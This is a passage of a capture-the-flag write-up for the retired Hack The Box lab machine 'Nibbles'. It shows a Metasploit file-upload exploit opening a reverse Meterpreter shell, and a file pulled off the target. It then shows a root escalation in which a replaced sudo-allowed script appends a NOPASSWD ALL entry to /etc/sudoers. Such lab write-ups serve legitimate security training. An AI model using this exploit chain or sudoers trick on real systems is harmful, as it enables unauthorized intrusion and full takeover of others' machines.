admin:nibbles granted access using the metasploit module.

## nibbler shell
```
msf exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Sending stage (40004 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.75:41482) at 2025-09-17 16:57:15 -0600

meterpreter > shell
Process 1669 created.
Channel 0 created.
whoami
nibbler
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

Nibbler has a zip file in their home directory.
```
meterpreter > download /home/nibbler/personal.zip 
[*] Downloading: /home/nibbler/personal.zip -> /home/kali/personal.zip
[*] Downloaded 1.81 KiB of 1.81 KiB (100.0%): /home/nibbler/personal.zip -> /home/kali/personal.zip
[*] Completed  : /home/nibbler/personal.zip -> /home/kali/personal.zip

```

The file was unzipped on the target. Since `nibbler` can run monitor.sh, a malicious file should be uploaded.

## malicious file to add nibbler to sudoers
```
┌──(kali㉿kali)-[~/…/Nibbles/10 - Loot/personal/stuff]
└─$ cat monitor.sh                  
#!/bin/bash

# Run this script as root
# add nibbler to sudoers
echo "$USER ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
```


```
meterpreter > upload ~/Desktop/HackTheBox/Retired\ Machines/Nibbles/10\ -\ Loot/
10\ -\ Loot.md  personal        
meterpreter > upload ~/Desktop/HackTheBox/Retired\ Machines/Nibbles/10\ -\ Loot/personal/stuff/monitor.sh 
[*] Uploading  : /home/kali/Desktop/HackTheBox/Retired Machines/Nibbles/10 - Loot/personal/stuff/monitor.sh -> monitor.sh
[*] Uploaded -1.00 B of 128.00 B (-0.78%): /home/kali/Desktop/HackTheBox/Retired Machines/Nibbles/10 - Loot/personal/stuff/monitor.sh -> monitor.sh
[*] Completed  : /home/kali/Desktop/HackTheBox/Retired Machines/Nibbles/10 - Loot/personal/stuff/monitor.sh -> monitor.sh
```

## Running the malicious file
```
cat monitor.sh
#!/bin/bash

# Run this script as root
# add nibbler to sudoers
echo "nibbler ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
whoami
nibbler
sudo /home/nibbler/personal/stuff/monitor.sh
nibbler ALL=(ALL) NOPASSWD: ALL
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
    (ALL) NOPASSWD: ALL
sudo su
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

```